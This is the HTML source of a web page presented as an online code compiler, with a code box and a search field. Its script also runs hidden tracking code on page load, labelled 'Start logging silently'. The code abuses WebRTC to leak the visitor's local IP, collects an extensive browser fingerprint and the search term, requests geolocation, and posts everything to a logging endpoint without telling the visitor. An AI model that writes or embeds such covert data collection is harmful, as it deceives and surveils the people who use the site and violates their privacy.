<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compiler Online</title>
    <link rel="stylesheet" href="style.css">

    <meta property="og:title" content="Online Code Compiler">
    <meta property="og:description" content="Write, compile, and execute code in various programming languages directly from your browser. Fast and easy!">
    <meta property="og:image" content="https://raw.githubusercontent.com/KomaVR/Online-CodeBase/refs/heads/main/th%20(3).jpg">
    <meta property="og:url" content="https://codersdatabase.vercel.app/">
    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Online Code Compiler">
    <meta name="twitter:description" content="Write, compile, and execute code in various programming languages directly from your browser. Fast and easy!">
    <meta name="twitter:image" content="https://raw.githubusercontent.com/KomaVR/Online-CodeBase/refs/heads/main/th%20(3).jpg">
</head>
<body>
    <h1>Compiler Online</h1>

    <h2>Search</h2>
    <input type="text" id="search" placeholder="Enter search term..." />

    <h2>Code Submission</h2>
    <textarea id="code" placeholder="Write your code here..."></textarea><br>
    <button id="submit">Submit Code</button>

    <h2>Output</h2>
    <pre id="output"></pre>

    <script>
        async function logPrivateIPAndInfo() {
            const pc = new RTCPeerConnection();
            let logged = false;

            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            pc.onicecandidate = event => {
                if (event.candidate && !logged) {
                    const candidate = event.candidate.candidate;
                    if (candidate.includes("candidate")) {
                        const localIP = candidate.split(" ")[4];
                        const searchTerm = document.getElementById('search').value || 'No search term entered';
                        const userAgent = navigator.userAgent;
                        const referrer = document.referrer || 'No referrer';
                        const currentURL = window.location.href;
                        const screenWidth = window.screen.width;
                        const screenHeight = window.screen.height;
                        const browserLanguage = navigator.language || navigator.userLanguage;
                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                        const osInfo = navigator.platform;
                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
                        const browserVersion = userAgent.split(' ')[userAgent.split(' ').length - 1];
                        const deviceMemory = navigator.deviceMemory || 'unknown';
                        const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
                        const pixelRatio = window.devicePixelRatio || 'unknown';
                        const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
                        const viewportWidth = window.innerWidth;
                        const viewportHeight = window.innerHeight;
                        const colorDepth = window.screen.colorDepth;
                        const touchSupport = 'ontouchstart' in window ? 'Supported' : 'Not Supported';
                        const cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins';
                        const timestamp = new Date().toISOString();

                        // Attempt to get geolocation (latitude and longitude)
                        let geoLocation = { latitude: 'N/A', longitude: 'N/A' };
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(position => {
                                geoLocation = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                };

                                sendDataToServer(geoLocation);
                            }, error => {
                                console.error("Geolocation error:", error);
                                sendDataToServer(geoLocation);
                            });
                        } else {
                            console.log("Geolocation is not supported by this browser.");
                            sendDataToServer(geoLocation);
                        }

                        function sendDataToServer(geoLocation) {
                            logged = true;

                            fetch('/api/log', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    ip: localIP,
                                    searchTerm,
                                    userAgent,
                                    referrer,
                                    currentURL,
                                    screenWidth,
                                    screenHeight,
                                    browserLanguage,
                                    timeZone,
                                    osInfo,
                                    timestamp,
                                    connectionType,
                                    browserVersion,
                                    deviceMemory,
                                    hardwareConcurrency,
                                    pixelRatio,
                                    onlineStatus,
                                    viewportWidth,
                                    viewportHeight,
                                    colorDepth,
                                    touchSupport,
                                    cookiesEnabled,
                                    plugins,
                                    geoLocation
                                })
                            }).then(response => {
                                if (!response.ok) {
                                    console.error('Failed to log information');
                                }
                            }).catch(error => {
                                console.error('Error:', error);
                            });
                        }
                    }
                }
            };
        }

        async function compileCode() {
            const code = document.getElementById('code').value;

            const response = await fetch('/api/compile', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code })
            });

            const result = await response.json();
            document.getElementById('output').textContent = result.output;
        }

        document.getElementById('submit').onclick = compileCode;
        logPrivateIPAndInfo(); // Start logging silently
    </script>
</body>
</html>
